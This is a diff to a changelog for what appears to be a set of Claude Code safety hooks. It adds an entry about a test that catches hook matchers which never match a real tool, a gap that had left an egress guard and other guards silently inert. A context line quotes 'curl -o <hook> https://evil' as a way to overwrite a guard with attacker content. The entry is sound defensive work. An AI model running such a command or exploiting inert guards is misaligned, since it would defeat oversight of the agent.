@@ -2,6 +2,19 @@
 
 ## Contents
 
+- [2.24.15] - 2026-07-30 — feat(tests): **nothing asserted that a matcher can match anything, so a registered, working, completely inert hook passed every check.** Two suites already cover neighbouring properties and both pass while a guard is dead: `test-orphan-registration` asserts a hook **is registered**, `test-hook-liveness` asserts it **responds when invoked directly**. Neither asks whether its matcher **selects any real tool** — which is precisely how v2.24.5 happened, with `mcp-egress-guard` registered, working, and never once running.
+
+  Two rules, deliberately of different strength:
+
+  - **Structural (version-independent).** Every token must be *capable* of matching. An `mcp__…` token containing no regex metacharacter can only match a tool literally named that, which no server exposes. This is the v2.24.5 shape, and it holds no matter which Claude Code version runs.
+  - **Membership (version-sensitive).** Every plain token must be a recognised tool name, catching typos like `Bahs` or `WriteFile`. Because the tool set varies by Claude Code version and platform, tokens kept deliberately for *other* versions live in `COMPAT_TOOLS` **with a stated reason** — `MultiEdit` (older releases) and `PowerShell` (Windows only) — so a genuine typo cannot be waved through by quietly appending it.
+
+  Scoped to `PreToolUse`/`PostToolUse`, since `Notification` matchers use their own vocabulary (`idle_prompt`, `auth_success`) and `FileChanged` matches **file paths**, not tools. The known-tool list is explicit rather than derived: the live tool set cannot be enumerated from inside a test, and inferring it would produce a check that breaks on every Claude Code release.
+
+  **Verified against history, not just fixtures.** Run on the real `v2.24.4` tree it reports **57 inert tokens across 13 registrations**, naming each hook — `mcp-egress-guard.sh`, `mcp-tracker.sh`, `mcp-sql-guard.sh`, `safety.sh`'s MCP-shell arm and the rest. It would have caught the regression the moment it was introduced. Four self-tests keep it honest: it must flag a bare `mcp__` matcher and a typo'd tool name, and must **not** flag the corrected `mcp__.*` form or a non-tool matcher vocabulary.
+
+  This is the third layer against one recurring failure — *declared but not effective*. `test-orphan-registration` covers "the file never runs", `test-suite-count-invariance` covers "the assertion never runs", and this covers "the matcher never matches". All three exist because each was a real outage first. Full suite **2676/0**.
+
 - [2.24.14] - 2026-07-30 — fix(security): **`harness-tamper-guard` blocked no way of WRITING a new file over a hook — `curl -o <hook> https://evil` replaced a guard with attacker content and nothing in the chain objected.** The verb list covered delete and edit-in-place (`rm`, `mv`, `chmod`, `truncate`, `tee`, `>`), but every create-or-overwrite form was absent. Verified against the whole PreToolUse chain — `harness-tamper-guard`, `safety.sh` and `code-security-scanner` — all seven of these were allowed by **every** guard:
 
   ```
